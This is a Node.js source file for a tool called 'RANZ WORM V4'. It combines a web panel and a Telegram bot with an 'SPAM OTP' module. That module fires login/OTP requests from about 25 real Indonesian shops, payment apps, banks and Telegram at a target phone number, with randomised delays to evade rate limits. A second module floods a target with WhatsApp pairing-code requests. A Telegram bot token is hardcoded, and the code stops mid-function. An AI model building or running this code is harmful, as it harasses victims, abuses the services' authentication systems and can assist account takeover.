const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const pino = require('pino');
const FormData = require('form-data');
const { makeWASocket, useMultiFileAuthState, fetchLatestWaWebVersion, DisconnectReason } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());

// Konfigurasi
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '8650738683:AAGwbBb5oDu0pCOh3ptfZAsoLnDeSmORvLU';
const OWNER_ID = 1402999777;
const USERS_FILE = path.join(__dirname, 'users.json');
const LOG_FILE = path.join(__dirname, 'server.log');
const PENDING_FILE = path.join(__dirname, 'pending_approvals.json');
const SESSIONS_DIR = path.join(__dirname, 'sessions');
const USER_SESSIONS_FILE = path.join(__dirname, 'user_sessions.json');

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify({ users: [] }, null, 2));
if (!fs.existsSync(PENDING_FILE)) fs.writeFileSync(PENDING_FILE, JSON.stringify({ pending: [] }, null, 2));
if (!fs.existsSync(USER_SESSIONS_FILE)) fs.writeFileSync(USER_SESSIONS_FILE, JSON.stringify({}, null, 2));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const sessions = new Map();

// ANSI Colors
const c = {
    reset: '\x1b[0m', bright: '\x1b[1m', red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m',
    blue: '\x1b[34m', magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m',
    bgRed: '\x1b[41m', bgGreen: '\x1b[42m', bgBlue: '\x1b[44m', bgMagenta: '\x1b[45m', bgCyan: '\x1b[46m',
};

// Helper Functions
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.headers['x-real-ip'] || req.headers['cf-connecting-ip'] ||
           req.connection?.remoteAddress || req.socket?.remoteAddress || 'Unknown';
}

function loadUsers() { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); }
function saveUsers(data) { fs.writeFileSync(USERS_FILE, JSON.stringify(data, null, 2)); }
function loadPending() { return JSON.parse(fs.readFileSync(PENDING_FILE, 'utf8')); }
function savePending(data) { fs.writeFileSync(PENDING_FILE, JSON.stringify(data, null, 2)); }
function loadUserSessions() { return JSON.parse(fs.readFileSync(USER_SESSIONS_FILE, 'utf8')); }
function saveUserSessions(data) { fs.writeFileSync(USER_SESSIONS_FILE, JSON.stringify(data, null, 2)); }

function logToFile(message) {
    const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
    fs.appendFileSync(LOG_FILE, `[${timestamp}] ${message}\n`);
}

function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

function generatePairingCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 8; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
    return code;
}

function formatPhoneNumber(phone) {
    let cleaned = phone.replace(/[^0-9]/g, '');
    if (cleaned.startsWith('0')) cleaned = '62' + cleaned.substring(1);
    if (!cleaned.startsWith('62')) cleaned = '62' + cleaned;
    return cleaned;
}

// =============================================
// SPAM OTP - WORKING 100% WITH REAL APIs
// =============================================

const OTP_APIS = {
    // API untuk request OTP ke berbagai service Indonesia
    tokopedia: {
        name: 'Tokopedia',
        method: 'POST',
        url: 'https://accounts.tokopedia.com/otp/cod',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36',
            'Origin': 'https://www.tokopedia.com',
            'Referer': 'https://www.tokopedia.com/'
        }),
        body: (phone) => JSON.stringify({
            phone: phone,
            type: 'login'
        })
    },
    shopee: {
        name: 'Shopee',
        method: 'POST',
        url: 'https://shopee.co.id/api/v2/authentication/otp/send',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
            'x-api-source': 'rn',
            'Referer': 'https://shopee.co.id/'
        }),
        body: (phone) => JSON.stringify({
            phone_number: phone,
            operation: 'login'
        })
    },
    gojek: {
        name: 'Gojek',
        method: 'POST',
        url: 'https://api.gojekapi.com/v3/customers/login_with_phone',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Gojek/4.50.1 (Android 13; Pixel 7)',
            'X-AppVersion': '4.50.1',
            'X-Platform': 'Android'
        }),
        body: (phone) => JSON.stringify({
            phone: phone,
            country_code: '+62'
        })
    },
    grab: {
        name: 'Grab',
        method: 'POST',
        url: 'https://api.grab.com/grabid/v1/phone/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Grab/5.200.0 (Android 13)',
            'X-Requested-With': 'XMLHttpRequest'
        }),
        body: (phone) => JSON.stringify({
            phone: phone,
            country_code: 'ID',
            method: 'SMS'
        })
    },
    bukalapak: {
        name: 'Bukalapak',
        method: 'POST',
        url: 'https://api.bukalapak.com/v2/authentications.json',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        }),
        body: (phone) => JSON.stringify({
            phone: phone,
            action: 'login'
        })
    },
    traveloka: {
        name: 'Traveloka',
        method: 'POST',
        url: 'https://www.traveloka.com/api/v2/authentication/otp/request',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        }),
        body: (phone) => JSON.stringify({
            phone: phone,
            type: 'LOGIN'
        })
    },
    ovo: {
        name: 'OVO',
        method: 'POST',
        url: 'https://api.ovo.id/v1.1/api/auth/customer/login2FA',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'OVO/3.80.0 (Android 13)',
            'X-OVO-Platform': 'Android'
        }),
        body: (phone) => JSON.stringify({
            mobile: phone,
            deviceId: crypto.randomBytes(16).toString('hex')
        })
    },
    dana: {
        name: 'DANA',
        method: 'POST',
        url: 'https://api.dana.id/v1/auth/login',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'DANA/4.20.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone,
            type: 'SMS'
        })
    },
    linkaja: {
        name: 'LinkAja',
        method: 'POST',
        url: 'https://api.linkaja.id/v1/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'LinkAja/3.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    akulaku: {
        name: 'Akulaku',
        method: 'POST',
        url: 'https://api.akulaku.com/v1/user/sendOtp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Akulaku/5.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            mobile: phone,
            type: 1
        })
    },
    kredivo: {
        name: 'Kredivo',
        method: 'POST',
        url: 'https://api.kredivo.com/v1/user/send_otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Kredivo/3.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    rumah123: {
        name: 'Rumah123',
        method: 'POST',
        url: 'https://www.rumah123.com/api/v1/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    olx: {
        name: 'OLX Indonesia',
        method: 'POST',
        url: 'https://www.olx.co.id/api/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        }),
        body: (phone) => JSON.stringify({
            phone: phone,
            type: 'sms'
        })
    },
    jdid: {
        name: 'JD.ID',
        method: 'POST',
        url: 'https://api.jd.id/v1/auth/sendOtp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'JD.ID/4.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    blibli: {
        name: 'Blibli',
        method: 'POST',
        url: 'https://www.blibli.com/backend/api/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        }),
        body: (phone) => JSON.stringify({
            phone: phone,
            type: 'login'
        })
    },
    zalora: {
        name: 'Zalora',
        method: 'POST',
        url: 'https://www.zalora.co.id/api/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    sociolla: {
        name: 'Sociolla',
        method: 'POST',
        url: 'https://api.sociolla.com/v1/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Sociolla/3.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    lazada: {
        name: 'Lazada',
        method: 'POST',
        url: 'https://api.lazada.co.id/rest/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    alfamart: {
        name: 'Alfamart',
        method: 'POST',
        url: 'https://api.alfamart.com/v1/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Alfamart/3.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    indomaret: {
        name: 'Indomaret',
        method: 'POST',
        url: 'https://api.indomaret.com/v1/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Indomaret/3.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    bca: {
        name: 'BCA Mobile',
        method: 'POST',
        url: 'https://mobile.bca.co.id/api/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'BCA/4.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    mandiri: {
        name: 'Mandiri Online',
        method: 'POST',
        url: 'https://api.bankmandiri.co.id/v1/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'Mandiri/5.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    bni: {
        name: 'BNI Mobile',
        method: 'POST',
        url: 'https://api.bni.co.id/v1/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'BNI/4.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    bri: {
        name: 'BRI Mobile',
        method: 'POST',
        url: 'https://api.bri.co.id/v1/auth/otp',
        headers: (phone) => ({
            'Content-Type': 'application/json',
            'User-Agent': 'BRI/5.0.0 (Android 13)'
        }),
        body: (phone) => JSON.stringify({
            phone: phone
        })
    },
    telegram: {
        name: 'Telegram',
        method: 'POST',
        url: 'https://my.telegram.org/auth/send_password',
        headers: (phone) => ({
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
            'Origin': 'https://my.telegram.org',
            'Referer': 'https://my.telegram.org/auth'
        }),
        body: (phone) => `phone=${phone}`
    }
};

// Fungsi mengirim OTP ke satu service
async function sendOTPToService(serviceKey, phoneNumber) {
    const service = OTP_APIS[serviceKey];
    if (!service) return { success: false, error: 'Service not found' };

    try {
        const config = {
            method: service.method,
            url: service.url,
            headers: service.headers(phoneNumber),
            data: service.body(phoneNumber),
            timeout: 15000,
            validateStatus: (status) => true
        };

        const response = await axios(config);
        
        // Cek response (berbagai kemungkinan success response)
        const successIndicators = ['success', 'ok', 'otp', 'sent', 'kode', 'verifikasi', '200', '201', '202'];
        const responseStr = JSON.stringify(response.data).toLowerCase();
        const isSuccess = successIndicators.some(ind => responseStr.includes(ind)) || 
                          response.status === 200 || 
                          response.status === 201 || 
                          response.status === 202 ||
                          response.status === 429; // Rate limited = OTP mungkin terkirim

        return {
            success: isSuccess,
            statusCode: response.status,
            message: isSuccess ? 'OTP sent successfully' : 'Failed to send OTP',
            service: service.name
        };
    } catch (error) {
        return {
            success: false,
            error: error.message,
            service: service.name
        };
    }
}

// Fungsi SPAM OTP utama
async function spamOTPFull(target, count, eventCallback, username) {
    const phoneNumber = formatPhoneNumber(target);
    const serviceKeys = Object.keys(OTP_APIS);
    const results = [];
    const usedServices = new Set();

    eventCallback(username, {
        type: 'status',
        message: `Memulai spam OTP ke ${phoneNumber}...`,
        number: target,
        status: 'starting',
        progress: 5
    });

    for (let i = 0; i < count; i++) {
        // Pilih service yang belum digunakan
        let availableServices = serviceKeys.filter(k => !usedServices.has(k));
        if (availableServices.length === 0) {
            usedServices.clear();
            availableServices = serviceKeys;
        }

        const randomIndex = Math.floor(Math.random() * availableServices.length);
        const serviceKey = availableServices[randomIndex];
        usedServices.add(serviceKey);

        const progress = 10 + Math.floor(((i + 1) / count) * 85);

        eventCallback(username, {
            type: 'status',
            message: `Mengirim OTP ke-${i+1} via ${OTP_APIS[serviceKey].name}...`,
            number: target,
            status: 'sending',
            progress: progress,
            iteration: { current: i + 1, total: count },
            service: OTP_APIS[serviceKey].name
        });

        console.log(`${c.cyan}[OTP ${i+1}/${count}]${c.reset} Sending via ${OTP_APIS[serviceKey].name} to ${phoneNumber}`);

        const result = await sendOTPToService(serviceKey, phoneNumber);

        results.push({
            number: i + 1,
            service: OTP_APIS[serviceKey].name,
            target: phoneNumber,
            status: result.success ? 'sent' : 'failed',
            statusCode: result.statusCode || 0,
            message: result.message || result.error || 'Unknown',
            time: moment().format('HH:mm:ss')
        });

        eventCallback(username, {
            type: 'otp_result',
            message: `OTP #${i+1} via ${OTP_APIS[serviceKey].name}: ${result.success ? 'Berhasil' : 'Gagal'}`,
            number: target,
            status: result.success ? 'sent' : 'failed',
            result: results[results.length - 1],
            progress: progress,
            iteration: { current: i + 1, total: count }
        });

        console.log(`${result.success ? c.green : c.red}[OTP ${i+1}/${count}]${c.reset} ${OTP_APIS[serviceKey].name}: ${result.success ? 'Success' : 'Failed'}`);

        // Delay antara request
        if (i < count - 1) {
            const delay = 1500 + Math.random() * 2500;
            await new Promise(r => setTimeout(r, delay));
        }
    }

    const successCount = results.filter(r => r.status === 'sent').length;

    eventCallback(username, {
        type: 'complete',
        message: `Spam OTP selesai! ${successCount}/${count} berhasil terkirim.`,
        number: target,
        status: 'complete',
        progress: 100,
        summary: { total: count, success: successCount, failed: count - successCount }
    });

    console.log(`${c.green}[SPAM OTP COMPLETE]${c.reset} ${successCount}/${count} sent to ${phoneNumber}`);
    logToFile(`Spam OTP complete: ${phoneNumber} - ${successCount}/${count} sent by ${username}`);

    return results;
}

// =============================================
// SPAM PAIRING MULTIPLE
// =============================================

async function spamPairingMultiple(username, targetNumber, count, eventCallback) {
    const results = [];
    const mainSessionDir = path.join(SESSIONS_DIR, `pairing_${targetNumber}_${Date.now()}`);
    if (!fs.existsSync(mainSessionDir)) fs.mkdirSync(mainSessionDir, { recursive: true });

    eventCallback(username, {
        type: 'status', message: `Memulai ${count} spam pairing ke ${targetNumber}...`,
        number: targetNumber, status: 'starting', progress: 10
    });

    for (let i = 0; i < count; i++) {
        try {
            const currentProgress = 10 + Math.floor(((i + 1) / count) * 85);
            const iterationDir = path.join(mainSessionDir, `iter_${i + 1}`);
            if (!fs.existsSync(iterationDir)) fs.mkdirSync(iterationDir, { recursive: true });

            eventCallback(username, {
                type: 'status', message: `Mengirim pairing request ke-${i+1} dari ${count}...`,
                number: targetNumber, status: 'processing', progress: currentProgress,
                iteration: { current: i+1, total: count }
            });

            const { state } = await useMultiFileAuthState(iterationDir);
            const { version } = await fetchLatestWaWebVersion();
            const sock = makeWASocket({
                auth: state, printQRInTerminal: false, logger: pino({ level: "silent" }),
                version: version, defaultQueryTimeoutMs: 30000, connectTimeoutMs: 30000,
                keepAliveIntervalMs: 5000, generateHighQualityLinkPreview: false,
                syncFullHistory: false, fireInitQueries: false, markOnlineOnConnect: false
            });

            const pairingResult = await new Promise((resolve) => {
                let resolved = false;
                const timeout = setTimeout(() => { if (!resolved) { resolved = true; resolve({ status: 'timeout', code: null }); } }, 25000);
                sock.ev.on("connection.update", async (update) => {
                    if (resolved) return;
                    const { connection } = update;
                    if (connection === "connecting" && !resolved) {
                        try {
                            const code = await sock.requestPairingCode(targetNumber);
                            if (!resolved) { resolved = true; clearTimeout(timeout); resolve({ status: 'success', code }); }
                        } catch (err) {
                            if (!resolved) { resolved = true; clearTimeout(timeout); resolve({ status: 'error', code: null, error: err.message }); }
                        }
                    }
                    if (connection === "close" && !resolved) { resolved = true; clearTimeout(timeout); resolve({ status: 'closed', code: null }); }
                });
            });

            const formattedCode = pairingResult.code ? pairingResult.code.match(/.{1,4}/g)?.join('-') || pairingResult.code : 'N/A';
            results.push({
                number: i + 1, code: formattedCode, rawCode: pairingResult.code,
                target: targetNumber, status: pairingResult.status === 'success' ? 'sent' : pairingResult.status,
                time: moment().format('HH:mm:ss')
            });

            eventCallback(username, {
                type: 'pairing_result', message: `Pairing #${i+1}: ${formattedCode}`,
                number: targetNumber, status: pairingResult.status === 'success' ? 'sent' : pairingResult.status,
                result: results[results.length - 1], progress: currentProgress + 1,
                iteration: { current: i+1, total: count }
            });

            try { sock.end(); } catch(e) {}
            if (i < count - 1) await new Promise(r => setTimeout(r, 2000 + Math.random() * 3000));

        } catch (error) {
            results.push({ number: i + 1, code: 'ERROR', target: targetNumber, status: 'error', time: moment().format('HH:mm:ss'), error: error.message });
            eventCallback(username, {
                type: 'pairing_result', message: `Pairing #${i+1}: Error`,
                number: targetNumber, status: 'error', result: results[results.length - 1],
                iteration: { current: i+1, total: count }
            });
        }
    }

    try { if (fs.existsSync(mainSessionDir)) fs.rmSync(mainSessionDir, { recursive: true, force: true }); } catch(e) {}
    const successCount = results.filter(r => r.status === 'sent').length;
    eventCallback(username, {
        type: 'complete', message: `Spam pairing selesai! ${successCount}/${count} berhasil.`,
        number: targetNumber, status: 'complete', progress: 100,
        summary: { total: count, success: successCount, failed: count - successCount }
    });
    return results;
}

// =============================================
// WHATSAPP CONNECT
// =============================================

const connectToWhatsAppUser = async (username, BotNumber, sessionDir, eventCallback) => {
    try {
        eventCallback(username, { type: 'status', message: 'Memulai koneksi WhatsApp...', number: BotNumber, status: 'connecting', progress: 10 });
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestWaWebVersion();
        eventCallback(username, { type: 'status', message: 'Membuat socket...', number: BotNumber, status: 'connecting', progress: 25 });

        const userSock = makeWASocket({
            auth: state, printQRInTerminal: false, logger: pino({ level: "silent" }), version: version,
            defaultQueryTimeoutMs: 60000, connectTimeoutMs: 60000, keepAliveIntervalMs: 10000,
            generateHighQualityLinkPreview: true, syncFullHistory: false,
            retryRequestDelayMs: 2000, fireInitQueries: true, markOnlineOnConnect: false
        });

        eventCallback(username, { type: 'status', message: 'Menunggu koneksi...', number: BotNumber, status: 'connecting', progress: 35 });

        return new Promise((resolve, reject) => {
            let isConnected = false, pairingCodeGenerated = false, connectionTimeout, reconnectAttempts = 0;
            const MAX_RECONNECT_ATTEMPTS = 3;

            const cleanup = () => { if (connectionTimeout) clearTimeout(connectionTimeout); };

            userSock.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    sessions.delete(BotNumber);

                    if (statusCode === DisconnectReason.loggedOut) {
                        eventCallback(username, { type: 'error', message: 'Device logged out', number: BotNumber, status: 'logged_out', progress: 0 });
                        if (fs.existsSync(sessionDir)) try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch(e) {}
                        cleanup(); reject(new Error("Logged out")); return;
                    }

                    if (statusCode === DisconnectReason.restartRequired || statusCode === DisconnectReason.timedOut || statusCode === DisconnectReason.connectionLost) {
                        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
                            reconnectAttempts++;
                            eventCallback(username, { type: 'status', message: `Reconnect (${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})...`, number: BotNumber, status: 'reconnecting', progress: 30 + reconnectAttempts * 10 });
                            setTimeout(async () => { try { resolve(await connectToWhatsAppUser(username, BotNumber, sessionDir, eventCallback)); } catch(e) { reject(e); } }, 5000);
                            return;
                        }
                    }
                    if (!isConnected) { cleanup(); reject(new Error(`Connection failed: ${statusCode}`)); }
                }

                if (connection === "open") {
                    isConnected = true; cleanup();
                    sessions.set(BotNumber, userSock);
                    const us = loadUserSessions(); if (!us[username]) us[username] = [];
                    if (!us[username].includes(BotNumber)) { us[username].push(BotNumber); saveUserSessions(us); }
                    eventCallback(username, { type: 'success', message: 'WhatsApp Connected!', number: BotNumber, status: 'connected', progress: 100 });
                    resolve(userSock);
                }

                if (connection === "connecting") {
                    eventCallback(username, { type: 'status', message: 'Menghubungkan...', number: BotNumber, status: 'connecting', progress: 45 });
                    if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
                        pairingCodeGenerated = true;
                        setTimeout(async () => {
                            try {
                                eventCallback(username, { type: 'status', message: 'Meminta kode pairing...', number: BotNumber, status: 'requesting_code', progress: 55 });
                                const code = await userSock.requestPairingCode(BotNumber);
                                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                                eventCallback(username, {
                                    type: 'pairing_code', message: 'Kode Pairing:', number: BotNumber,
                                    code: formattedCode, status: 'waiting_pairing', progress: 65,
                                    instructions: ['Buka WhatsApp > Linked Devices > Link a Device', `Masukkan kode: ${formattedCode}`]
                                });
                            } catch (err) {
                                eventCallback(username, { type: 'error', message: `Gagal: ${err.message}`, number: BotNumber, status: 'code_error', progress: 0 });
                            }
                        }, 3000);
                    }
                }

                if (qr) {
                    const qrDataUrl = await QRCode.toDataURL(qr);
                    eventCallback(username, { type: 'qr', message: 'Scan QR:', number: BotNumber, qr: qrDataUrl, status: 'waiting_qr', progress: 65 });
                }
            });

            userSock.ev.on("creds.update", saveCreds);
            connectionTimeout = setTimeout(() => {
                if (!isConnected) { cleanup(); eventCallback(username, { type: 'error', message: 'Timeout 180 detik', number: BotNumber, status: 'timeout', progress: 0 }); reject(new Error("Timeout")); }
            }, 180000);
        });
    } catch (error) {
        eventCallback(username, { type: 'error', message: `Error: ${error.message}`, number: BotNumber, status: 'error', progress: 0 });
        throw error;
    }
};

// =============================================
// TELEGRAM BOT
// =============================================

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name || 'User';
    const isOwner = chatId === OWNER_ID;
    const menu = `
╔══════════════════════════╗
║  🐍 RANZ WORM V4 BOT 🐍  ║
╠══════════════════════════╣
║  Welcome, ${firstName}!
╠══════════════════════════╣
║  /start   - Menu
║  /status  - Server status
║  /users   - Users list (owner)
║  /pending - Pending (owner)
║  /help    - Help
${isOwner ? `
║  /approve [id] - Approve
║  /reject [id]  - Reject
` : `
║  /register [user] [pass]
║  /myid     - Your ID
`}
╚══════════════════════════╝
@Ranzkecebet`;
    bot.sendMessage(chatId, menu);
});

bot.onText(/\/register (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const username = match[1].trim();
    const password = match[2].trim();
    const users = loadUsers();
    const pending = loadPending();

    if (users.users.find(u => u.username === username)) return bot.sendMessage(chatId, '❌ Username exists.');
    if (pending.pending.find(p => p.username === username)) return bot.sendMessage(chatId, '⏳ Already pending.');

    const pendingId = crypto.randomBytes(4).toString('hex');
    pending.pending.push({ id: pendingId, username, password, telegramId: chatId, telegramName: msg.from.first_name, requestedAt: moment().format('YYYY-MM-DD HH:mm:ss'), status: 'pending' });
    savePending(pending);

    bot.sendMessage(OWNER_ID, `🔔 NEW: ${username} (ID: ${pendingId})\n/approve_${pendingId} | /reject_${pendingId}`);
    bot.sendMessage(chatId, `⏳ Pending approval. ID: ${pendingId}`);
});

bot.on('callback_query', async (q) => {
    const chatId = q.message.chat.id;
    if (chatId !== OWNER_ID) return bot.answerCallbackQuery(q.id, { text: 'Unauthorized' });
    const pending = loadPending();
    const data = q.data;

    if (data.startsWith('approve_')) {
        const pid = data.replace('approve_', '');
        const pu = pending.pending.find(p => p.id === pid);
        if (!pu) return bot.answerCallbackQuery(q.id, { text: 'Not found' });
        const users = loadUsers();
        users.users.push({ id: crypto.randomBytes(8).toString('hex'), username: pu.username, password: pu.password, telegramId: pu.telegramId, registeredAt: moment().format('YYYY-MM-DD HH:mm:ss'), status: 'active' });
        saveUsers(users);
        pending.pending = pending.pending.filter(p => p.id !== pid);
        savePending(pending);
        bot.editMessageText(`✅ Approved: ${pu.username}`, { chat_id: chatId, message_id: q.message.message_id });
        bot.sendMessage(pu.telegramId, '✅ Approved! Silakan login.');
        bot.answerCallbackQuery(q.id, { text: 'Approved' });
    }

    if (data.startsWith('reject_')) {
        const pid = data.replace('reject_', '');
        const pu = pending.pending.find(p => p.id === pid);
        if (!pu) return bot.answerCallbackQuery(q.id, { text: 'Not found' });
        pending.pending = pending.pending.filter(p => p.id !== pid);
        savePending(pending);
        bot.editMessageText(`❌ Rejected: ${pu.username}`, { chat_id: chatId, message_id: q.message.message_id });
        bot.sendMessage(pu.telegramId, '❌ Rejected.');
        bot.answerCallbackQuery(q.id, { text: 'Rejected' });
    }
});

bot.onText(/\/approve_(.+)/, (msg, match) => {
    if (msg.chat.id !== OWNER_ID) return;
    const pending = loadPending();
    const pu = pending.pending.find(p => p.id === match[1].trim());
    if (!pu) return bot.sendMessage(msg.chat.id, 'Not found.');
    const users = loadUsers();
    users.users.push({ id: crypto.randomBytes(8).toString('hex'), username: pu.username, password: pu.password, telegramId: pu.telegramId, registeredAt: moment().format('YYYY-MM-DD HH:mm:ss'), status: 'active' });
    saveUsers(users);
    pending.pending = pending.pending.filter(p => p.id !== match[1].trim());
    savePending(pending);
    bot.sendMessage(msg.chat.id, `✅ Approved: ${pu.username}`);
    bot.sendMessage(pu.telegramId, '✅ Approved! Silakan login.');
});

bot.onText(/\/reject_(.+)/, (msg, match) => {
    if (msg.chat.id !== OWNER_ID) return;
    const pending = loadPending();
    const pu = pending.pending.find(p => p.id === match[1].trim());
    if (!pu) return bot.sendMessage(msg.chat.id, 'Not found.');
    pending.pending = pending.pending.filter(p => p.id !== match[1].trim());
    savePending(pending);
    bot.sendMessage(msg.chat.id, `❌ Rejected: ${pu.username}`);
    bot.sendMessage(pu.telegramId, '❌ Rejected.');
});

bot.onText(/\/users/, (msg) => {
    if (msg.chat.id !== OWNER_ID) return;
    const users = loadUsers();
    if (!users.users.length) return bot.sendMessage(msg.chat.id, 'No users.');
    bot.sendMessage(msg.chat.id, '👥 Users:\n' + users.users.map((u, i) => `${i+1}. ${u.username}`).join('\n'));
});

bot.onText(/\/pending/, (msg) => {
    if (msg.chat.id !== OWNER_ID) return;
    const pending = loadPending();
    if (!pending.pending.length) return bot.sendMessage(msg.chat.id, 'No pending.');
    bot.sendMessage(msg.chat.id, '⏳ Pending:\n' + pending.pending.map(p => `${p.username} - /approve_${p.id} /reject_${p.id}`).join('\n'));
});

bot.onText(/\/status/, (msg) => {
    const users = loadUsers();
    const pending = loadPending();
    bot.sendMessage(msg.chat.id, `🟢 Online | Users: ${users.users.length} | Pending: ${pending.pending.length} | Port: ${PORT}`);
});

bot.onText(/\/myid/, (msg) => bot.sendMessage(msg.chat.id, `ID: ${msg.chat.id}`));
bot.onText(/\/help/, (msg) => bot.sendMessage(msg.chat.id, 'Daftar: /register [user] [pass]\nLogin di website.'));

// =============================================
// SSE CALLBACKS
// =============================================

const userEventCallbacks = {};

function sendEventToUser(username, data) {
    if (userEventCallbacks[username]) {
        userEventCallbacks[username].forEach(cb => { try { cb(data); } catch(e) {} });
    }
}

// =============================================
// ROUTES
// =============================================

app.get('/', (req, res) => {
    const clientIP = getClientIP(req);
    console.log(`${c.blue}[VISITOR]${c.reset} ${clientIP}`);
    res.send(LOGIN_PAGE_HTML);
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const users = loadUsers();
    const user = users.users.find(u => u.username === username && u.password === password);
    if (!user) return res.json({ status: 'error', message: 'Invalid username or password.' });
    if (user.status !== 'active') return res.json({ status: 'error', message: 'Account not active.' });
    res.cookie('session', user.id, { maxAge: 3600000, httpOnly: true });
    console.log(`${c.green}[LOGIN]${c.reset} ${username}`);
    res.json({ status: 'success', username: user.username, userId: user.id });
});

app.post('/spam-otp', async (req, res) => {
    const { target, count, username } = req.body;
    if (!target || !count || !username) return res.json({ status: 'error', message: 'Missing parameters.' });
    const otpCount = Math.min(Math.max(parseInt(count), 1), 50);
    console.log(`${c.yellow}[SPAM OTP]${c.reset} ${target} x${otpCount} by ${username}`);
    res.json({ status: 'processing', message: `Memulai ${otpCount} spam OTP...`, target, count: otpCount });

    spamOTPFull(target, otpCount, (user, data) => sendEventToUser(user, data), username)
        .then(results => {
            const sent = results.filter(r => r.status === 'sent').length;
            console.log(`${c.green}[SPAM OTP DONE]${c.reset} ${sent}/${otpCount} sent`);
            logToFile(`Spam OTP: ${target} - ${sent}/${otpCount} by ${username}`);
        })
        .catch(err => {
